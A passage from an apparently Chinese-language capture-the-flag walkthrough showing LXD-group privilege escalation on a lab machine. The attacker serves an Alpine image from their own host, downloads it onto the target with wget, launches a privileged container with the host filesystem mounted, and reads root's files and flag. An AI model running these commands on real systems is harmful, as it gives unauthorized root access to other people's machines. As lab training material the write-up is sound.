(14/18) Installing scanelf (1.2.3-r0) (15/18) Installing musl-utils (1.1.19-r11) (16/18) Installing libc-utils (0.7.1-r0) (17/18) Installing alpine-keys (2.1-r1) (18/18) Installing alpine-base (3.8.5-r0) Executing busybox-1.28.4-r3.trigger OK: 7 MiB in 18 packages  ┌──(root㉿kali)-[/home/kali/Desktop/tools/lxd-alpine-builder] └─# ls -la                 总计 7256 drwxr-xr-x  3 root root    4096  1月12日 05:53 . drwxrwxrwx 43 kali kali    4096  1月12日 05:34 .. -rw-r--r--  1 root root 3259593  1月12日 05:34 alpine-v3.13-x86_64-20210218_0139.tar.gz -rw-r--r--  1 root root 4113983  1月12日 05:53 alpine-v3.23-x86_64-20260112_0553.tar.gz -rwxr-xr-x  1 root root    8064  1月12日 05:34 build-alpine drwxr-xr-x  7 root root    4096  1月12日 05:34 .git -rw-r--r--  1 root root   26530  1月12日 05:34 LICENSE -rw-r--r--  1 root root     768  1月12日 05:34 README.md                                                                 ┌──(root㉿kali)-[/home/kali/Desktop/tools/lxd-alpine-builder] └─# python3 -m http.server 8888         Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...  ```  |
| --- |


| ```plain # codeshield earlyp@codeshield:~$ cd /tmp earlyp@codeshield:/tmp$ wget http://192.168.0.106:8888/alpine-v3.23-x86_64-20260112_0553.tar.gz  earlyp@codeshield:/tmp$ lxc image import ./alpine*.tar.gz --alias myimage If this is your first time running LXD on this machine, you should also run: lxd init To start your first container, try: lxc launch ubuntu:22.04 Or for a virtual machine: lxc launch ubuntu:22.04 --vm   Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b earlyp@codeshield:/tmp$ lxd init Would you like to use LXD clustering? (yes/no) [default=no]:  Do you want to configure a new storage pool? (yes/no) [default=yes]:  Name of the new storage pool [default=default]:  Name of the storage backend to use (dir, lvm, zfs, btrfs, ceph, cephobject) [default=zfs]:  Create a new ZFS pool? (yes/no) [default=yes]:  Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:  Size in GiB of the new loop device (1GiB minimum) [default=9GiB]:  Would you like to connect to a MAAS server? (yes/no) [default=no]:  Would you like to create a new local network bridge? (yes/no) [default=yes]:  What should the new bridge be called? [default=lxdbr0]:  What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:  What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:  Would you like the LXD server to be available over the network? (yes/no) [default=no]:  Would you like stale cached images to be updated automatically? (yes/no) [default=yes]:  Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:   earlyp@codeshield:/tmp$  earlyp@codeshield:/tmp$ lxc init myimage mycontainer -c security.privileged=true Creating mycontainer earlyp@codeshield:/tmp$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to mycontainer earlyp@codeshield:/tmp$ lxc start mycontainer earlyp@codeshield:/tmp$ lxc exec mycontainer /bin/sh ~ # whoami;id;pwd root uid=0(root) gid=0(root) /root ~ # ls -la total 3 drwx------    2 root     root             3 May 30 08:09 . drwxr-xr-x   19 root     root            19 May 30 08:08 .. -rw-------    1 root     root            21 May 30 08:09 .ash_history ~ # cd /mnt/root /mnt/root # ls -la total 4005969 drwxr-xr-x   19 root     root          4096 Aug 22  2023 . drwxr-xr-x    3 root     root             3 May 30 08:08 .. lrwxrwxrwx    1 root     root             7 Aug 10  2023 bin -> usr/bin drwxr-xr-x    4 root     root          4096 Aug 23  2023 boot drwxr-xr-x   20 root     root          4240 May 30 06:20 dev drwxr-xr-x  164 root     root         12288 Aug 30  2023 etc drwxr-xr-x   14 root     root          4096 Aug 26  2023 home lrwxrwxrwx    1 root     root             7 Aug 10  2023 lib -> usr/lib lrwxrwxrwx    1 root     root             9 Aug 10  2023 lib32 -> usr/lib32 lrwxrwxrwx    1 root     root             9 Aug 10  2023 lib64 -> usr/lib64 lrwxrwxrwx    1 root     root            10 Aug 10  2023 libx32 -> usr/libx32 drwx------    2 root     root         16384 Aug 22  2023 lost+found drwxr-xr-x    3 root     root          4096 May 30 08:07 media drwxr-xr-x    2 root     root          4096 Aug 10  2023 mnt drwxr-xr-x    7 root     root          4096 Aug 26  2023 opt dr-xr-xr-x  368 root     root             0 May 30 06:17 proc drwx------    9 root     root          4096 Aug 26  2023 root drwxr-xr-x   50 root     root          1380 May 30 06:51 run lrwxrwxrwx    1 root     root             8 Aug 10  2023 sbin -> usr/sbin drwxr-xr-x   12 root     root          4096 Aug 30  2023 snap drwxr-xr-x    3 root     root          4096 Aug 22  2023 srv -rw-------    1 root     root     4102029312 Aug 22  2023 swap.img dr-xr-xr-x   13 root     root             0 May 30 06:17 sys drwxrwxrwt   25 root     root          4096 May 30 08:09 tmp drwxr-xr-x   14 root     root          4096 Aug 10  2023 usr drwxr-xr-x   16 root     root          4096 Aug 26  2023 var /mnt/root # cd root /mnt/root/root # ls -la total 96 drwx------    9 root     root          4096 Aug 26  2023 . drwxr-xr-x   19 root     root          4096 Aug 22  2023 .. -rw-------    1 root     root            26 May 30 07:53 .bash_history -rw-r--r--    1 root     root          3106 Oct 15  2021 .bashrc drwx------    2 root     root          4096 Aug 28  2023 .cache drwxr-xr-x    3 root     root          4096 Aug 26  2023 .iredmail drwx------    3 root     root          4096 Aug 23  2023 .launchpadlib -rw-------    1 root     root            20 Aug 23  2023 .lesshst drwxr-xr-x    3 root     root          4096 Aug 22  2023 .local -r--------    1 root     root            45 Aug 26  2023 .my.cnf -rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-amavisd -rw-r--r--    1 root     root            92 Aug 26  2023 .my.cnf-fail2ban -rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-iredadmin -rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-iredapd -rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-roundcube -r--------    1 root     root            89 Aug 26  2023 .my.cnf-vmail -r--------    1 root     root            94 Aug 26  2023 .my.cnf-vmailadmin -rw-r--r--    1 root     root           161 Jul  9  2019 .profile -rw-r--r--    1 root     root            66 Aug 26  2023 .selected_editor drwx------    2 root     root          4096 Aug 22  2023 .ssh -rw-r--r--    1 root     root             0 Aug 22  2023 .sudo_as_admin_successful -rw-r--r--    1 root     root           290 Aug 26  2023 .wget-hsts drwxr-xr-x    2 root     root          4096 Aug 26  2023 cowrie -rw-r--r--    1 root     root          2528 Aug 26  2023 root.txt drwx------    4 root     root          4096 Aug 22  2023 snap /mnt/root/root # cat root.txt                @@@                                   @@@@@@@@@  @@@@@@                       @@@@@@@@@@@@@@          (@@                  @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                     @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗                @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║                @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║                  @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝                   @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝                       @@@@@@@   @@@                                   @@@@@@@                                                               _______________________________________________________________________________________________________  |  _ROOT FLAG!________________________________________________________________________________________  |  | |                                                                                                   | |  | | Educate_your_employees_on_password_safety                                                         | |  | |                                                                                                   | |  | |___________________________________________________________________________________________________| |  |_______________________________________________________________________________________________________| ```  |
| --- |


同样可以拿到shell！

